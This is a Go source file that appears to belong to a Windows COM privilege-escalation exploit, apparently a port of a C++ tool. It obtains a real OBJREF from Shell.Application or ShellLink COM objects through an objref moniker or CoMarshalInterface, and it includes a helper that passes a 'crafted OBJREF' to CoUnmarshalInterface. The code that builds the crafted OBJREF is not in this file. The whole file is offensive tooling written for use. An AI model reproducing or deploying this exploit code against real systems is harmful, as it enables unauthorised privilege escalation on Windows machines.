package main

import (
	"encoding/base64"
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// IID_IUnknown {00000000-0000-0000-C000-000000000046}
var iidIUnknown = [16]byte{
	0x00, 0x00, 0x00, 0x00,
	0x00, 0x00,
	0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

// CLSID_Shell.Application {13709620-C279-11CE-A49E-444553540000}
var clsidShellApplication = [16]byte{
	0x20, 0x96, 0x70, 0x13,
	0x79, 0xC2,
	0xCE, 0x11,
	0xA4, 0x9E, 0x44, 0x45, 0x53, 0x54, 0x00, 0x00,
}

// CLSID_ShellLink {00021401-0000-0000-C000-000000000046}
var clsidShellLink = [16]byte{
	0x01, 0x14, 0x02, 0x00,
	0x00, 0x00,
	0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

func hresultFailed(hr uintptr) bool {
	return int32(uint32(hr)) < 0
}

func coInitialize() {
	procCoInitializeEx.Call(0, uintptr(coinitApartmentThreaded))
}

func coUninitialize() {
	procCoUninitialize.Call()
}

// createLocalObjRef obtains a real, rpcss-registered OXID from a local COM
// object and returns its marshaled OBJREF bytes.
//
// The objref moniker is tried first (same as the C++ port); if it is not
// available the object is marshaled directly.
func createLocalObjRef() ([]byte, error) {
	classes := [][16]byte{clsidShellApplication, clsidShellLink}
	var punk uintptr
	var hr uintptr

	for _, clsid := range classes {
		hr, _, _ = procCoCreateInstance.Call(
			uintptr(unsafe.Pointer(&clsid)),
			0,
			uintptr(clsctxLocalServer|clsctxInprocServer),
			uintptr(unsafe.Pointer(&iidIUnknown)),
			uintptr(unsafe.Pointer(&punk)))
		if !hresultFailed(hr) && punk != 0 {
			break
		}
		punk = 0
	}
	if punk == 0 {
		return nil, fmt.Errorf("CoCreateInstance failed: hr=0x%x", uint32(hr))
	}
	defer comRelease(punk)

	if data, err := objRefFromMoniker(punk); err == nil && len(data) > 0 {
		logInfo("[*] OBJREF source: objref moniker (%d bytes)", len(data))
		return data, nil
	} else {
		logInfo("[!] objref moniker failed: %v", err)
	}
	logInfo("[*] OBJREF source: CoMarshalInterface (MSHCTX_LOCAL)")
	return objRefFromMarshal(punk)
}

func objRefFromMoniker(punk uintptr) ([]byte, error) {
	var moniker uintptr
	hr, _, _ := procCreateObjrefMoniker.Call(punk, uintptr(unsafe.Pointer(&moniker)))
	if hresultFailed(hr) || moniker == 0 {
		return nil, fmt.Errorf("CreateObjrefMoniker failed: hr=0x%x", uint32(hr))
	}
	defer comRelease(moniker)

	var bindCtx uintptr
	procCreateBindCtx.Call(0, uintptr(unsafe.Pointer(&bindCtx)))
	if bindCtx != 0 {
		defer comRelease(bindCtx)
	}

	var displayName *uint16
	// IMoniker::GetDisplayName is vtable slot 20.
	r := vtableCall(moniker, 20, bindCtx, 0, uintptr(unsafe.Pointer(&displayName)))
	if hresultFailed(r) || displayName == nil {
		return nil, fmt.Errorf("GetDisplayName failed: hr=0x%x", uint32(r))
	}
	name := windows.UTF16PtrToString(displayName)
	procCoTaskMemFree.Call(uintptr(unsafe.Pointer(displayName)))

	// "objref:<base64>:" -> base64
	if strings.HasPrefix(name, "objref:") {
		name = name[len("objref:"):]
	}
	name = strings.ReplaceAll(name, ":", "")

	data, err := base64.StdEncoding.DecodeString(name)
	if err != nil || len(data) == 0 {
		return nil, fmt.Errorf("objref base64 decode failed")
	}
	return data, nil
}

func objRefFromMarshal(punk uintptr) ([]byte, error) {
	var stream uintptr
	hr, _, _ := procCreateStreamOnHGlobal.Call(0, 0, uintptr(unsafe.Pointer(&stream)))
	if hresultFailed(hr) || stream == 0 {
		return nil, fmt.Errorf("CreateStreamOnHGlobal failed: hr=0x%x", uint32(hr))
	}
	defer comRelease(stream)

	hr, _, _ = procCoMarshalInterface.Call(
		stream,
		uintptr(unsafe.Pointer(&iidIUnknown)),
		punk,
		uintptr(mshctxLocal),
		0,
		uintptr(mshlflagsTablestrong))
	if hresultFailed(hr) {
		return nil, fmt.Errorf("CoMarshalInterface failed: hr=0x%x", uint32(hr))
	}

	var hglobal uintptr
	hr, _, _ = procGetHGlobalFromStream.Call(stream, uintptr(unsafe.Pointer(&hglobal)))
	if hresultFailed(hr) || hglobal == 0 {
		return nil, fmt.Errorf("GetHGlobalFromStream failed: hr=0x%x", uint32(hr))
	}
	size, _, _ := procGlobalSize.Call(hglobal)
	if size == 0 {
		return nil, fmt.Errorf("GlobalSize returned 0")
	}
	ptr, _, _ := procGlobalLock.Call(hglobal)
	if ptr == 0 {
		return nil, fmt.Errorf("GlobalLock failed")
	}
	data := make([]byte, size)
	copy(data, unsafe.Slice((*byte)(unsafe.Pointer(ptr)), int(size)))
	procGlobalUnlock.Call(hglobal)
	return data, nil
}

// coUnmarshalInterface feeds the crafted OBJREF to CoUnmarshalInterface.
func coUnmarshalInterface(data []byte) (uintptr, error) {
	hglobal, _, _ := procGlobalAlloc.Call(uintptr(gmemMoveable|gmemZeroInit), uintptr(len(data)))
	if hglobal == 0 {
		return 0, fmt.Errorf("GlobalAlloc failed")
	}
	ptr, _, _ := procGlobalLock.Call(hglobal)
	if ptr == 0 {
		return 0, fmt.Errorf("GlobalLock failed")
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(ptr)), len(data)), data)
	procGlobalUnlock.Call(hglobal)

	var stream uintptr
	hr, _, _ := procCreateStreamOnHGlobal.Call(hglobal, 1, uintptr(unsafe.Pointer(&stream)))
	if hresultFailed(hr) || stream == 0 {
		return 0, fmt.Errorf("CreateStreamOnHGlobal failed: hr=0x%x", uint32(hr))
	}
	defer comRelease(stream)

	var ppv uintptr
	hr, _, _ = procCoUnmarshalInterface.Call(
		stream,
		uintptr(unsafe.Pointer(&iidIUnknown)),
		uintptr(unsafe.Pointer(&ppv)))
	if hresultFailed(hr) {
		return 0, fmt.Errorf("CoUnmarshalInterface failed: hr=0x%x", uint32(hr))
	}
	return ppv, nil
}
